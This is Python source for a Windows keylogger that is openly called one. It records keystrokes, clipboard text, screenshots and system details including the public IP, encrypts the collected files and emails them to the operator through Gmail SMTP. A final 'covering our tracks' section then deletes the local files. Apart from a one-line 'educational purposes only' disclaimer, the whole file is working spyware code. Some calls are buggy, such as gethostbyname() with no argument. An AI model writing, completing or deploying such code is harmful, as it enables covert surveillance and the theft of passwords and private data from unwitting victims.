
### LIBRARIES ###


from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os
import time

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

### VARIABLES ###


# Email function variables
# The email address you wish to send keylogger to
to_address = "victims_email_address@gmail.com"
# Your email address, the one you want to send gathered information to
email_address = "your_email_address@gmail.com"
# Your email address password
password = "xxxx xxxx xxxx xxxx"  # Use gmail app password here

# !! This is for educational purposes only, do not use for any illegal activity !!
# !! I highly recommend using burner email adddresses to test this out and not personal ones !!

# Victims computer information function variables
system_information = "systeminfo.txt"

# Clipboard function variables
clipboard_information = 'clipboard.txt'

# Screenshot function variables
screenshot_information = "screenshot.png"

# Timing function variables (how regularly we wish to save the information gathered)
number_of_iterations = 0
time_iteration = 10
number_of_iterations_end = 6
current_time = time.time()
stopping_time = time.time() + time_iteration

# Key logger variables
keys_information = 'key_log.txt'

# File variables
# Enter the file path you wish to save your files to, dont forget to have \\ inbetween folders
# This is an example file path
file_path = 'C:\\Users\\username\\Documents\\Python\\Projects'
extend = '\\'
file_merge = file_path + extend

# Encrypted file variables
e_keys_information = "e_key_log.txt"
e_system_information = "e_systeminfo.txt"
e_clipboard_information = "e_clipboard.txt"

# We can use GenerateEncryptionKey.py to generate a new encryption key anytime
# This is an example encryption key
key = 'ZUIRz9a1FWoxPE2bHGEol8MGDARZTyPoufWOrFQR-iw='

### SENDING EMAIL FUNCTION ###


# Setup port number and server name
smtp_port = 587  # Standard secure SMTP port for SSL try port 465 if 587 does not work
smtp_server = "smtp.gmail.com"  # Standard Google SMTP server


def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Key Log File"  # Subject of the email we recieve

    body = "Data collected by the key logger"

    msg.attach(MIMEText(body, 'plain'))

    # Open the file in python as a binary
    filename = filename
    attachment = open(attachment, 'rb')  # Opens attachment

    attachment_package = MIMEBase('application', 'octet-stream')

    attachment_package.set_payload((attachment).read())

    encoders.encode_base64(attachment_package)

    attachment_package.add_header(
        'Content-Disposition', "attachment; filename= %s" % filename)  # Adds email header

    msg.attach(attachment_package)

    text = msg.as_string()

    # Connect to the server
    print("Connecting to server...")
    TIE_server = smtplib.SMTP(smtp_server, smtp_port)
    TIE_server.starttls()
    TIE_server.login(fromaddr, password)
    print("Succesfully connected to server")
    print()

    # Send emails to "person" as list is iterated
    print(f"Sending email to: {toaddr}...")
    TIE_server.sendmail(fromaddr, toaddr, text)
    print(f"Email sent to: {toaddr}")
    print()

    # Close the port
    TIE_server.quit()


# Sends the files to your email address
send_email(keys_information, file_path + extend + keys_information, to_address)


### GATHERING VICTIMS SYSTEM INFO FUNCTION ###


def computer_information():
    with open(file_path + extend + system_information, 'a') as f:
        hostname = socket.gethostbyname()
        IPaddress = socket.gethostbyname(hostname)
        # Using try-except to allow api ipify to give us the public IP address without blocking the keylogger, as api ipify only works a certain amount of times
        try:
            public_ip = get("https://api.ipify.org").text
            f.write('Public IP Address: ' + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (likely max queries used)")

        # Provides proccessor info
        f.write("Processor: " + (platform.processor()) + '\n')
        # Provides system info
        f.write("System: " + platform.system() +
                " " + platform.version() + '\n')
        # Provides machine info
        f.write("Machine: " + platform.machine() + '\n')
        # Provides hostname info
        f.write("Hostname: " + hostname + '\n')
        # Provides private IP address
        f.write("Private IP Address: " + IPaddress + '\n')

        # Saves victims system information to 'systeminfo.txt'


computer_information()

### GATHERING VICTIMS CLIPBOARD INFO FUNCTION ###


def copy_clipboard():
    with open(file_path + extend + clipboard_information, 'a') as f:
        # **THIS WILL ONLY COPY STRINGS**, I.E will not copy images saved to victims clipboard
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write('Clipboard could be not be copied')


copy_clipboard()


### CAPTURING SCREENSHOTS OF VICTIMS DEVICE FUNCTION ###

# Grabs a screenshot of the victims screen
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

### TIMED KEYLOGGING FUNCTION ###


while number_of_iterations < number_of_iterations_end:

    ### KEYLOGGING FUNCTION ###
    count = 0
    keys = []

    def on_press(key):
        global keys, count, current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

    # Organising key_log.txt file
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # Writing logged keys to file

    def write_file(keys):
        with open(file_path + extend + keys_information, 'a') as f:
            # Making key_log.txt readable
            for key in keys:
                k = str(key).replace("'", "")       # Changes 'h''i' to hi
                if k.find('space') > 0:
                    f.write('\n')                   # Seperates words typed
                    f.close()
                elif k.find('Key') == -1:           # Makes key_log.txt more readable
                    f.write(k)

                # Saves detected key strokes to 'key_log.txt'

    # Creating way to quit the program by pressing the 'ESC' key

    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Resets all fucntions so we have a new 'clean' file devoid of previous information, once enough time has passed
    if current_time > stopping_time:
        with open(file_path + extend + keys_information, 'w') as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path +
                   extend + screenshot_information, to_address)

        copy_clipboard()

        number_of_iterations += 1

        current_time = time.time()
        stopping_time = time.time() + time_iteration

### ENCRYPTING OUR FILES ###


files_to_encrypt = [file_merge + system_information, file_merge +
                    clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + e_system_information,
                        file_merge + e_clipboard_information, file_merge + e_keys_information]

count = 0

for encrypting_file in files_to_encrypt:
    # Reads all the data in the following files key_log.txt, systeminfo.txt and clipboard.txt
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
# Encrypts those files with our generated key
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
# Encrypts the following files key_log.txt, systeminfo.txt & clipboard.txt
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
# Sends the encrypted files to our email
    send_email(encrypted_file_names[count],
               encrypted_file_names[count], to_address)
    # Increases the count moves the loop onto the next item in our list (encrypts the files 1 by 1)
    count += 1

# Pauses the key logger for 2 mins so the files can be sent without interruption
time.sleep(120)
### COVERING OUR TRACKS ###

# Complies we wish to delete into a list
delete_files = [system_information, clipboard_information,
                keys_information, screenshot_information]

# Deletes said files from the users computer
for file in delete_files:
    os.remove(file_merge + file)
